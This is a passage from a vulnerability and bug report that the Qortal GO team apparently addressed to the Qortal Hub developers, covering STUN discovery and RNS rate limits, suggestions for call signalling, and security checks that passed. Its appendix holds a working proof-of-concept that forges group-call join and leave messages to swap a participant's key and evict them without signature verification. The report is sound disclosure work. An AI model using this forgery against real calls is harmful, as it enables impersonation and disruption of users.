- **Docs drift.** `docs/group-audio-calls.md:9-11` describes "up to 10 … 11 to 50 with clusters", but the code caps calls at 15 (`group-call.ts:241`) with a cluster size of 15 (`groupCallTopology.ts:26`), so clustering never happens. The docs also point at the dead `useGroupVoiceCall.ts` (`:29`, `:72`, `:125`, `:340`).
- **Type drift.** The `AudioSurfaceEvent` type in `src/lib/group-call/audioSurfaceBridge.ts` has no `group-call-rtc-state`, which the runtime emits (`groupCallAudioEngineRuntime.ts:6229`) and `electron/src/audio-surface-ipc.ts:209` declares. `tsc` reports it.

---

### B-15. Community STUN discovery runs on RNS announces, which transport nodes rate-limit, so new installs and phones hear very few endpoints

- **Category:** bug
- **Severity:** medium. The code is [V]. Two things are [T], measured on the live network (see Proof): a public Qortal transport node stops passing a destination's announces after the first 6, and a new client hears very few endpoints. The refill of about one announce an hour and the daily totals below are [V]: they follow from RNS's default target. Our measurement cannot tell a 3600 s target from any target above about 30 s, and a node operator can set a different one. How much this affects established Hubs is [I].

**Where**

- **Contributors re-announce every 2 min with a 10 min lease.**
  - `stun-coordinator.ts:50-51` (`ADVERTISE_INTERVAL_MS`, `ADVERTISE_TTL_MS`), timer at `:519-522`, lease set at `:640-644`.
  - Python turns each advertisement into an RNS announce of the community-STUN destination (`_announce_community_stun_endpoint`, v3.0.3 `:9192-9210` / develop `:9256-9274`).
- **One destination per contributor per day.** The anonymous identity rotates every 24 h (v3.0.3 `:59` / develop `:61`).
- **Discovery queries are announces of the same destination, and Python does not throttle them.**
  - Every `get_community_stun_endpoints` command announces `{"v":1,"q":true}` (v3.0.3 `:9258-9281`, announce at `:9275` / develop `:9322-9345`, `:9339`).
  - The coordinator sends one at start and on every bridge `ready` (forced, `stun-coordinator.ts:136`, `:163`, `:239`), every 4 min (`:40`, `:171-174`), and whenever the ICE pool is empty, at most every 5 s (`:41`, `:254-256`, `:562-570`).
- **Every contributor answers a query with another announce**, after a random 0–2 s, at most once per 30 s (v3.0.3 `:9070-9089` / develop `:9134-9153`).

So one contributing Hub's daily destination sends about 30 endpoint announces an hour. It also sends 15 or more query announces an hour, and up to 120 query answers.

**What RNS does with that.** We read RNS 1.4.2 (`build-rnsd-frozen.py:23-26` installs it) and 1.3.4:

- **Default limit on transport nodes.** On a node with `enable_transport`, every interface without its own setting gets `announce_rate_target = 3600` s, grace 5 and penalty 0 (1.4.2: `RNS/Reticulum.py:854-857`, `RNS/Interfaces/Interface.py:90-92`; 1.3.4: `:812-815`, `:89-91`). Client connections spawned by a TCP or Backbone server interface inherit it (1.4.2: `RNS/Interfaces/TCPInterface.py:635`, `BackboneInterface.py:304`).
- **How the limit works.** `Transport.inbound` keeps one rate entry per destination hash (1.4.2: `RNS/Transport.py:1896-1924`; 1.3.4: `:1837-1865`).
  - An announce that arrives less than 3600 s after the last accepted one counts as a violation.
  - After more than 5 violations, the node stops rebroadcasting that destination until `last + 3600`.
  - A blocked announce still reaches the node's own handlers, but it is never rebroadcast (1.4.2: `:1948`; 1.3.4: `:1889`).
- **Where it applies.** Hubs run rnsd with `enable_transport = False` unless the user opts in (`electron/src/reticulum-daemon.ts:1924`, `:1932`). So the limit is applied by the transport nodes that Hubs connect to.

**Symptom**

- **Most endpoint announces are dropped.** For each contributor, each transport node passes the first 6 announces of the day's destination [T], which covers about the first 12 minutes. After that, with the default target, it passes about one an hour [V]. That is roughly 30 of the 700 or more endpoint announces a contributor sends each day [V].
- **Queries and answers use the same budget.** They are announces of the same destination, so a busy contributor's queries and answers can use up its daily budget before its own endpoint does.
- **Hubs hardly notice.** `stun-cache.db` keeps about 32 endpoints (a soft cap, `stun-cache.ts:19`, pruned at `:451-456`). The coordinator re-probes them for 24 h after their last success (`stun-coordinator.ts:47`, `:319-359`). So a Hub that heard an endpoint once keeps using it as long as it answers probes.
- **New clients see almost nothing.** New installs, fresh profiles and clients without a persistent cache, such as phones, depend on live announces. Their own queries are also dropped after the first 6.

**Proof (measured on the live network, 19 October 2026)** [T]

1. **The limit is active on the Qortal transport nodes.** We announced a throwaway destination 12 times, 30 s apart, through a public Qortal Reticulum transport node. It used our own aspect and carried no Qortal data. A listener connected to that node and to one other public Qortal transport node listened for 8 minutes, until about 2 minutes after the last announce. Announces 1 to 6 arrived; 7 to 12 did not.
2. **What a new client hears.** We ran a fresh RNS client (1.3.4) set up like GO: no transport, connected to the public Qortal transport nodes, with an announce handler for the community-STUN aspect that parses announces like `presence_bridge.py` does.
   - In 19 minutes it heard 16 endpoint announces for about 10 distinct endpoints, mostly once each.
   - In the same 19 minutes it heard 41 query announces.
   - GO on our emulator held between 0 and 4 endpoints still inside their 10-minute lease at the same moments.
3. **Hubs against GO in our lab.** The desktop Hubs served a full pool of 6 verified endpoints from `stun-cache.db`. GO, which then kept only live leases, had none at the moment of our test call (`getIceServers()` returned `[]`). So the call's WebRTC leg had no public candidate, and the call stayed on Reticulum (see "Tested interop").

**Suggested fix**

With the default 3600 s target and leases of at most 1 h, announces alone cannot keep an endpoint visible all the time. So we suggest the first point as the main fix, with the others to reduce the damage in the meantime.

- **Move endpoint lists off announces (main fix).** A contributor, or any Hub with a verified pool, could serve its current list through an RNS request handler over a link. A new client would then need to hear just one announce that day to fetch a whole list, instead of collecting announces one at a time.
- **Answer a query with a packet, not an announce.** develop's MASQUE handler already accepts answers as packets sent to the query's destination (`set_packet_callback`, develop `:9488-9490`; `received_packet`, `:9383-9384`). Doing the same for community STUN would stop answers from spending the contributor's budget and from flooding the network.
- **Throttle queries, and keep them off the endpoint destination.**
  - Rate-limit the query announce in Python, for example to one per 10 min. The coordinator's 5 s floor is far below the transport nodes' 3600 s target.
  - Send queries from a separate destination, so they never spend a contributor's endpoint budget.
  - develop's MASQUE relay discovery already gives each query a fresh return destination for this reason. See presence_bridge.py develop `:9527-9536`, and the comment at `:9528-9530`. A fresh destination avoids the per-destination limit, but every query still floods the whole network, so keep queries rare.
- **Announce less, with leases well under the 1 h ceiling.**
  - 3.0.x receivers drop an advert whose expiry `x` is more than 1 h ahead of their own clock (v3.0.3 `:9104` / develop `:9168`; `stun-coordinator.ts:311`). `x` comes from the contributor's clock. With a 60 min lease, every receiver whose clock is behind the contributor's by more than the announce's travel time would drop it. On the live network we saw announces from senders whose clocks were about 6.5 minutes ahead of ours.
  - So use, for example, a 45–50 min lease, re-announced every 60 min or more. Add jitter only upwards: RNS counts every interval under the target as a violation, and takes one off only for an interval at or above it (1.4.2: `RNS/Transport.py:1913-1914`; 1.3.4: `:1854-1855`).
  - That leaves 10–15 min an hour with no live lease. Consumers bridge the gap from their cache (`stun-cache.db` on Hub).
  - Query answers are announces of the same destination and count against the same budget. So hourly announces only stay under the target if answers move to packets too.
  - Another way: raise the receivers' 1 h ceiling in one release, and lengthen leases in a later one, once most receivers accept them.

**Compatibility.** Leases well under 1 h and a query throttle are local changes that every 3.0.x receiver accepts. A higher lease ceiling only helps once receivers have it. Packet answers and a request handler are additive. Keep announcing endpoints, less often, for old receivers.

**GO.** GO never contributes and never answers queries.

- In the build we lab-tested, GO asked its Python bridge for the list at every call setup, sometimes several times per call: the shared transport retries an empty list every 750 ms for 12 s (`src/lib/call/directVoiceWebRtcTransport.ts:43-44`). Each request was a query announce, so GO used up its own 6 queries within seconds. GO also kept only endpoints inside their announce lease.
- **(built, not lab-tested yet)** GO's host now lets at most one query announce out every 10 min; other requests get the live list without an announce. GO also keeps a 24 h cache of heard endpoints and uses a cached one only after it answered a probe, like `stun-cache.db` ("How GO interoperates", item 7).

---

## 4. Suggestions

### X-1. Capability is resent every 12 s forever, and RTC signals can only travel over an audio link

- **Category:** suggestion
- **Severity:** low [V]

**Where**

- `syncGroupRtcTransports` re-signs and sends a capability to every edge that is not open, every `GROUP_RTC_CAPABILITY_RETRY_MS = 12_000` (`groupCallAudioEngineRuntime.ts:889`, `:6262-6312`), for the whole call.
- `GroupCallManager.sendRtcSignal` returns `direct-link-not-ready` unless a verified audio link exists (`group-call.ts:6034-6050`), so WebRTC cannot rescue a call whose Reticulum audio link cannot form.

**Suggestion**

- Use exponential backoff, and stop after a few unanswered capabilities (peers that do not support WebRTC, or that chose Reticulum only).
- Allow signed RTC signals over the pinned call path too. Receivers verify them independently of the path.

**GO.** With Private calls on, GO's group WebRTC edges never connect, so Hub peers keep sending a capability every 12 s per edge.

---

### X-2. Optional "don't make me forwarder" hint for phones

- **Category:** suggestion
- **Severity:** medium [V for today's rule]

Election considers only the digest (P-7). Failover takes 11.5 s (`groupCallAudioEngineRuntime.ts:784`). Phones are elected root about 1/N of the time, even though Android may freeze background apps and data may be metered.

**Suggestion.** An optional `fwd:0` hint that the election skips when another eligible peer exists. It must **not** go into the GC_JOIN signed field set, because old Hubs rebuild that set and would fail verification. Carry it as an unsigned hint or in a separate signed message.

**GO.** Until something like this exists, GO accepts the root role whenever it is elected.

---

### X-3. Optional ringing acknowledgement and CALL_REQUEST re-broadcast

- **Category:** suggestion
- **Severity:** low

There is no way for the caller to tell "delivered and ringing" from "still trying". The call events are only incoming, accepted, rejected and hangup (plus `rtc-signal`).

**Suggestion.**

- An optional `CALL_RINGING` from the callee, ignored by old peers, would let the UI show the difference.
- Together with B-5's re-broadcast, it would also stop the caller from re-flooding once the callee has been reached.

**GO.** GO does not depend on this. It would send it when its native ringer fires, if Hub adds it.

---

### X-4. Allow calling an account whose presence has lapsed

- **Category:** suggestion
- **Severity:** low [V]

`initiateCall` returns "no route" when there is no current Reticulum presence route (`call.ts:1487-1500`). Phones whose presence lapsed while asleep cannot be called.

**Suggestion.** Fall back to the last known destinations for that address, with a bounded age. Show "may be asleep" instead of failing.

---

### X-5. A separate Python lane for call signalling, and slimmer queue diagnostics

- **Category:** suggestion
- **Severity:** low [V]

- **Shared lane.** `send_call`, `fanout_call`, `send_group_call` and `fanout_group_call` share the generic `control-send` lane with all Reticulum chat sends (`_scheduler_lane_for_command` falls through to `"control-send"`, v3.0.3 `:5734-5775` / develop `:5788-5839`). A chat burst can therefore delay call signalling past its 20–30 s windows. A dedicated call lane would avoid that.
- **Heavy diagnostics.** `group_audio_queue_state` ships the full scheduler diagnostics up to twice a second for as long as any audio link is busy (`_AUDIO_QUEUE_STATE_MIN_INTERVAL_SECONDS = 0.5`, v3.0.3 `:846`, `:4252-4300` / develop `:857`, `:4292-4340`). A slim payload during calls, with full diagnostics on request, would save main-process time.

---

## Things we checked that are fine

- The WebRTC DTLS fingerprint is bound to the wallet. SDP travels inside a signed GC_RTC_SIGNAL whose `payloadHash` is in the signed fields (`group-call.ts:6006-6024`). Receivers verify it with a replay cache and a ±20 s window, through `verifyPool.verify` directly, so S-1 does not affect it.
- GC_KEY binds `callSessionId`, `mediaSessionGeneration`, `keyCommitment` and `encryptedKeyDigest`. Only the current root's key is accepted (`group-call.ts:12621-12675`).
- The member gate fails closed for Qortal group rooms when no allowlist is set (`group-call.ts:3137-3148`).
- 1:1 CALL\_\* signatures check address derivation (`ed25519-verify-common.ts:202-220`), and the call id is route-bound to the caller's destination (`call.ts:2238-2262`).
- The community STUN UDP server has ingress and response rate limits (`electron/src/stun-udp-server.ts:16-27`).

---

## Appendix A: signature-cache harness (S-1)

This runs the unmodified `GroupCallManager` from `electron/src/group-call.ts`. Bundle it with `esbuild --bundle --platform=node` and run it with Node. It swaps `verifyPool` for an inline verifier that counts calls. The results are in the S-1 table.

```ts
import { GroupCallManager } from '../electron/src/group-call';
import {
  verifyGcDetached,
  generateNativeEd25519KeyPair,
  signEd25519Detached,
} from '../electron/src/ed25519-verify-common';
import {
  base58Encode,
  deriveAddressFromPublicKey,
  canonicalizeForSigning,
} from '../electron/src/presence';
import {
  encodeJoinWire,
  encodeLeaveWire,
} from '../electron/src/group-call-wire-reticulum';

const mk = () => {
  const kp = generateNativeEd25519KeyPair();
  const pk = base58Encode(kp.publicKey);
  return { kp, pk, address: deriveAddressFromPublicKey(pk) };
};
const sign = (a: any, f: Record<string, unknown>) =>
  base58Encode(signEd25519Detached(canonicalizeForSigning(f), a.kp.privateKey));
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));

(async () => {
  const mgr = new GroupCallManager(
    { getRouteForAddress: () => null, getRoutesForAddress: () => [] } as any,
    null
  );
  let verifies = 0;
  const joined: any[] = [];
  mgr.on('gcall:participant-joined', (e: any) => joined.push(e));
  (mgr as any).verifyPool = {
    start() {},
    stop() {},
    verify: async (p: any) => {
      verifies++;
      return verifyGcDetached(
        p.fields,
        p.signature,
        p.fromPublicKey,
        p.fromAddress
      );
    },
  };
  const local = mk(),
    alice = mk(),
    mallory = mk(),
    room = 'gcall-dm-test-room',
    ts = Date.now();
  mgr.setLocalAddresses([local.address]);
  mgr.joinRoom(
    room,
    'c',
    local.address,
    sign(local, {
      type: 'GC_JOIN',
      roomId: room,
      chatId: 'c',
      fromAddress: local.address,
      fromPublicKey: local.pk,
      timestamp: ts,
      reticulumDestinationHash: 'aa'.repeat(16),
    }),
    local.pk,
    ts,
    'aa'.repeat(16)
  );
  const gj = (who: any, pk: string, sig: string, m: number, d: string) =>
    (mgr as any).handleReticulumGroupCallWire(
      encodeJoinWire({
        roomId: room,
        chatId: 'c',
        fromAddress: who.address,
        fromPublicKey: pk,
        signature: sig,
        timestamp: m,
        reticulumDestinationHash: d,
      }),
      d,
      d,
      ''
    );
  const aliceSig = sign(alice, {
    type: 'GC_JOIN',
    roomId: room,
    chatId: 'c',
    fromAddress: alice.address,
    fromPublicKey: alice.pk,
    timestamp: ts,
    reticulumDestinationHash: 'bb'.repeat(16),
  });
  gj(alice, alice.pk, aliceSig, ts, 'bb'.repeat(16));
  await wait(50); // legit: 1 verify
  let v = verifies;
  gj(alice, mallory.pk, aliceSig, Date.now() + 5, 'cc'.repeat(16));
  await wait(50);
  const row: any = mgr
    .getRoomParticipants(room)
    .find((p: any) => p.address === alice.address);
  console.log(
    'forged GJ verifies:',
    verifies - v,
    'alice key swapped:',
    row.publicKey === mallory.pk,
    'alice dest:',
    row.reticulumDestinationHash.slice(0, 4)
  ); // 0, true, 'cccc'
  console.log(
    'participant-joined with mallory key for alice:',
    joined.filter(
      (e: any) => e.address === alice.address && e.publicKey === mallory.pk
    ).length
  ); // 1
  const mTs = Date.now() + 10,
    mSig = sign(mallory, {
      type: 'GC_LEAVE',
      roomId: room,
      fromAddress: mallory.address,
      fromPublicKey: mallory.pk,
      timestamp: mTs,
    });
  (mgr as any).handleReticulumGroupCallWire(
    encodeLeaveWire({
      roomId: room,
      fromAddress: mallory.address,
      fromPublicKey: mallory.pk,
      signature: mSig,
      timestamp: mTs,
    }),
    'dd'.repeat(16),
    'dd'.repeat(16),
    ''
  );
  await wait(50);
  v = verifies;
  (mgr as any).handleReticulumGroupCallWire(
    encodeLeaveWire({
      roomId: room,
      fromAddress: alice.address,
      fromPublicKey: alice.pk,
      signature: mSig,
      timestamp: Date.now() + 20,
    }),
    'dd'.repeat(16),
    'dd'.repeat(16),
    ''
  );
  await wait(50);
  console.log(
    'forged GL verifies:',
    verifies - v,
    'alice still in room:',
    mgr.getRoomParticipants(room).some((p: any) => p.address === alice.address)
  ); // 0, false
  mgr.stop();
  process.exit(0);
})();
```

We are happy to share the full test files, or to test fixes against GO before a Hub release.

Thanks,
the Qortal GO team
